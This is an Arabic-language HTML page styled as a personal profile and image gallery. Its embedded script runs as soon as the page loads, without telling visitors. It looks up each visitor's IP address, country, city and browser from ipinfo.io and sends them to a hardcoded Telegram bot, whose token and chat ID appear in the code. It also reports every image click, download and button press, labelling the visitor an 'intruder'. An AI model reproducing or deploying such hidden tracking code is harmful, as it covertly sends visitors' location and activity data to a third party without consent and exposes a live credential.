
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
  <title>طائفة الظلام - DKSTx666</title>
  <style>
    body {
      margin: 0;
      background-color: pink;
      font-family: Arial, sans-serif;
      direction: rtl;
    }

    .header {
      width: 100%;
      height: 200px;
      background-image: url('cover.jpg'); /* 👑 صورة الغلاف */
      background-size: cover;
      background-position: center;
      position: relative;
    }

    .profile-pic {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      background-color: purple;
      border: 4px solid white;
      position: absolute;
      bottom: -50px;
      right: 20px;
      animation: pulse 2s infinite;
      object-fit: cover;
      cursor: pointer;
    }

    .content {
      padding: 70px 10px 100px;
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 10px;
    }

    .post-img {
      width: 100%;
      height: 100px;
      object-fit: cover;
      cursor: pointer;
      border-radius: 10px;
      transition: transform 0.3s;
    }

    .post-img:hover {
      transform: scale(1.05) rotate(1deg);
    }

    .video-fab, .blog-fab {
      position: fixed;
      bottom: 20px;
      width: 60px;
      height: 60px;
      border-radius: 50%;
      color: white;
      font-size: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: pulse 2s infinite;
      cursor: pointer;
      z-index: 1000;
    }

    .video-fab {
      right: 20px;
      background-color: purple;
      box-shadow: 0 0 15px purple;
    }

    .blog-fab {
      left: 20px;
      background-color: yellow;
      color: black;
      box-shadow: 0 0 15px yellow;
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }

    /* نافذة التكبير */
    .popup {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background-color: rgba(0,0,0,0.8);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2000;
    }

    .popup img {
      max-width: 90%;
      max-height: 90%;
    }

    .download-btn {
      position: absolute;
      bottom: 20px;
      background: white;
      color: black;
      padding: 10px 20px;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="profile.jpg" class="profile-pic" onclick="enlargeImage('profile.jpg')"> <!-- بدون link خارجي -->
  </div>

  <div class="content">
    <!-- 👑 صور المنشورات -->
    <img src="img1.jpg" class="post-img" onclick="enlargeImage('img1.jpg')">
    <img src="img2.jpg" class="post-img" onclick="enlargeImage('img2.jpg')">
    <img src="img3.jpg" class="post-img" onclick="enlargeImage('img3.jpg')">
    <!-- أضف حتى 25 صورة -->
  </div>

  <!-- 👑 زر الفيديو -->
  <div class="video-fab" onclick="reportClick('📹 صفحة الفيديوهات') || goToPage('video.html')" title="صفحة الفيديوهات">🎥</div>

  <!-- 👑 زر المدونات -->
  <div class="blog-fab" onclick="reportClick('📖 صفحة المدونات') || goToPage('index')" title="صفحة المدونات">📖</div>

  <!-- 👑 نافذة التكبير -->
  <div id="popup" class="popup" style="display:none;" onclick="closePopup()">
    <img id="popup-img" src="">
    <a id="download-link" class="download-btn" download target="_blank">تحميل الصورة</a>
  </div>

  <script>
    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";

    // 👑 إرسال رسالة إلى البوت
    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      });
    }

    // 👑 إرسال IP والموقع عند الدخول فقط
    window.addEventListener("load", () => {
      fetch("https://ipinfo.io/json").then(res => res.json()).then(data => {
        const msg = `🚨 دخول جديد للموقع:\n🌍 IP: ${data.ip}\n📍 الدولة: ${data.country} - المدينة: ${data.city}\n🕹️ المتصفح: ${navigator.userAgent}`;
        sendToTelegram(msg);
      });
    });

    // 👑 تكبير صورة عند النقر
    function enlargeImage(src) {
      document.getElementById("popup-img").src = src;
      document.getElementById("download-link").href = src;
      document.getElementById("popup").style.display = "flex";
      sendToTelegram(`🖼️ تم النقر على صورة:\n${src}`);
    }

    // 👑 عند تحميل صورة
    document.getElementById("download-link").addEventListener("click", function(e) {
      e.stopPropagation(); // منع غلق النافذة
      sendToTelegram(`📥 تم تحميل صورة:\n${this.href}`);
    });

    // 👑 إغلاق النافذة
    function closePopup() {
      document.getElementById("popup").style.display = "none";
    }

    // 👑 الإبلاغ عند الضغط على زر
    function reportClick(text) {
      sendToTelegram(`👆 الدخيل ضغط على: ${text}`);
    }

    // 👑 الانتقال لصفحة
    function goToPage(url) {
      window.location.href = url;
    }
  </script>
</body>
</html>
